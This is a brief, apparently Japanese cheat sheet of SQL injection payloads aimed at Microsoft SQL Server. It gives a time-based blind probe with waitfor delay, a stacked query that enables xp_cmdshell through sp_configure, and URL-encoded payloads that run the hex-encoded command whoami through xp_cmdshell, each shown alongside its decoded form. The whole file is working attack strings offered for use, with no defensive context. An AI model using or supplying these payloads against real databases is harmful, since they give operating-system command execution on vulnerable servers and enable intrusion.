```
# タイムベース
' and 1=1; waitfor delay '00:00:05'; -- // 

# コマンド実行(0x77686f616d69 == whoami)
%27%3BDECLARE%20%40pkfq%20VARCHAR%288000%29%3BSET%20%40pkfq%3D0x77686f616d69%3BINSERT%20INTO%20sqlmapoutput%28data%29%20EXEC%20master..xp_cmdshell%20%40pkfq--
# ';DECLARE @pkfq VARCHAR(8000);SET @pkfq=0x77686f616d69;INSERT INTO sqlmapoutput(data) EXEC master..xp_cmdshell @pkfq--

# xp_cmdshell有効化設定
%27%3B%20EXEC%20sp%5Fconfigure%20%27show%20advanced%20options%27%2C%201%3B%20RECONFIGURE%3B%20EXEC%20sp%5Fconfigure%20%27xp%5Fcmdshell%27%2C%201%3B%20RECONFIGURE%3B%2D%2D
# '; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--

# コマンド実行(0x77686f616d69 == whoami)
%27%3BDECLARE%20%40pkfq%20VARCHAR%288000%29%3B%20SET%20%40pkfq%20%3D%200x77686f616d69%3B%20EXEC%20master%2E%2Exp%5Fcmdshell%20%40pkfq%3B%20%2D%2D%20
# ';DECLARE @pkfq VARCHAR(8000); SET @pkfq = 0x77686f616d69; EXEC master..xp_cmdshell @pkfq; -- 


```